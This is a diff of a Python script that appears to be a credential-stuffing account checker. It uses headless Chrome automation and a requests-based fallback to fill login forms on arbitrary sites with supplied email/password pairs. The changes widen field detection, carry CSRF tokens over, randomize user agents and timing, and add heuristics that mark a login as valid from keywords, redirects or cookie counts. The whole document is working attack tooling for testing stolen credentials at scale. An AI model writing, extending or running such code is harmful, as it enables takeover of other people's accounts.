@@ -550,8 +550,8 @@ def check_for_updates():
         print(f"  {R}[!] CONNECTION_LOST: {str(e)[:40]}{RES}")
     
     wait_enter()
-                
-# ── REAL CHROME ENGINE ──
+    
+ # ── REAL CHROME ENGINE ──
 class RealChrome:
     def __init__(self):
         self.proc = None
@@ -595,10 +595,11 @@ class RealChrome:
         try:
             self._start()
             ws = self._ws_url()
+            self._cmd(ws, "Target.createTarget", {"url":"about:blank"})
             self._cmd(ws, "Page.navigate", {"url":url})
             time.sleep(4)
             js = f"""
-                const e=document.querySelector('input[type="email"],input[type="text"],input[name*="email"],input[name*="user"]');
+                const e=document.querySelector('input[type="email"],input[type="text"],input[name*="email"],input[name*="user"],input[name*="login"]');
                 const p=document.querySelector('input[type="password"]');
                 if(e)e.value='{email}'; if(p)p.value='{password}';
                 const b=document.querySelector('button[type="submit"],input[type="submit"]');
@@ -606,32 +607,75 @@ class RealChrome:
             """
             self._cmd(ws, "Runtime.evaluate", {"expression":js})
             time.sleep(3)
-            check = "document.body.innerText.includes('Logout')||document.body.innerText.includes('Account')"
+            check = "document.body.innerText.includes('Logout')||document.body.innerText.includes('My Account')||document.body.innerText.includes('Dashboard')||document.body.innerText.includes('Sign Out')"
             r = self._cmd(ws, "Runtime.evaluate", {"expression":check})
-            res['active'] = bool(r.get("result",{}).get("value",False))
-            res['info'] = "OK" if res['active'] else "Invalid"
-        except Exception as e: res['info'] = f"Err:{str(e)[:20]}"
-        finally: self._stop()
+            ok = bool(r.get("result",{}).get("value",False))
+            if ok:
+                res['active'] = True
+                res['info'] = "OK"
+            else:
+                curl = self._cmd(ws, "Runtime.evaluate", {"expression":"window.location.href"})
+                cur_url = curl.get("result",{}).get("value","")
+                if cur_url and 'login' not in cur_url.lower() and 'signin' not in cur_url.lower():
+                    res['active'] = True
+                    res['info'] = "Redirect"
+                else:
+                    res['active'] = False
+                    res['info'] = "Invalid"
+        except Exception as e:
+            res['info'] = f"Err:{str(e)[:30]}"
+        finally:
+            self._stop()
         return res
 
 # ── HTTP FALLBACK ──
 def http_login(url, email, password):
     res = {'link':url, 'email':email, 'pass':password, 'active':False, 'info':''}
+    url = fix_url(url)
+    sess = requests.Session()
+    sess.headers.update({"User-Agent": random.choice(USER_AGENTS)})
     try:
-        sess = requests.Session()
-        sess.headers.update({"User-Agent": random.choice(USER_AGENTS)})
-        r = sess.get(fix_url(url), timeout=12)
+        time.sleep(random.uniform(0.3,1.0))
+        r = sess.get(url, timeout=12, allow_redirects=True)
         soup = BeautifulSoup(r.text, 'html.parser')
-        form = next((f for f in soup.find_all('form') if f.find('input',{'type':'password'})), None)
-        if not form: return res
+        form = None
+        for f in soup.find_all('form'):
+            if f.find('input',{'type':'password'}): form = f; break
+        if not form:
+            res['info'] = "No form"
+            return res
+        inputs = {i.get('name'):i.get('value','') for i in form.find_all('input') if i.get('name')}
+        uf = next((k for k in inputs if 'user' in k or 'login' in k or 'email' in k), None)
+        if not uf:
+            for k in inputs:
+                if k not in ('password','pass','pwd','submit','button','csrf','token'): uf = k; break
+        pf = next((k for k in inputs if 'pass' in k), 'password')
         action = urljoin(url, form.get('action',''))
-        # Simplified form filling for brevity, keeping original logic flow
-        r2 = sess.post(action, data={'email':email, 'password':password}, timeout=12)
-        if any(k in r2.text.lower() for k in ['logout','dashboard','welcome']):
+        csrf_val = next((v for k,v in inputs.items() if 'csrf' in k or 'token' in k), None)
+        csrf_name = next((k for k,v in inputs.items() if 'csrf' in k or 'token' in k), None)
+        data = {uf:email, pf:password}
+        if csrf_name and csrf_val: data[csrf_name] = csrf_val
+        for k,v in inputs.items():
+            if k not in (uf,pf,csrf_name): data[k] = v
+        sess.headers['Referer'] = url
+        r2 = sess.post(action, data=data, timeout=12, allow_redirects=True)
+        text = r2.text.lower(); final = r2.url.lower()
+        ok_kw = ['logout','dashboard','welcome','account','profile','inbox','home','feed','member','sign out']
+        fail_kw = ['incorrect','invalid','wrong','error','not found',"doesn't match",'does not match','please try again','login failed']
+        if any(k in text for k in ok_kw) and not any(k in text for k in fail_kw):
             res['active'] = True; res['info'] = "OK"
-    except: res['info'] = "Error"
+        elif any(k in text for k in fail_kw):
+            res['active'] = False; res['info'] = "Invalid"
+        elif 'login' not in final and 'signin' not in final:
+            res['active'] = True; res['info'] = "Redirect"
+        elif len(sess.cookies) > 2:
+            res['active'] = True; res['info'] = "Cookies"
+        else:
+            res['active'] = False; res['info'] = "Login page"
+    except Exception as e:
+        res['info'] = f"Err:{str(e)[:30]}"
     return res
-
+    
 # ── MAIN ENGINE ──
 def main():
     os.system('clear')
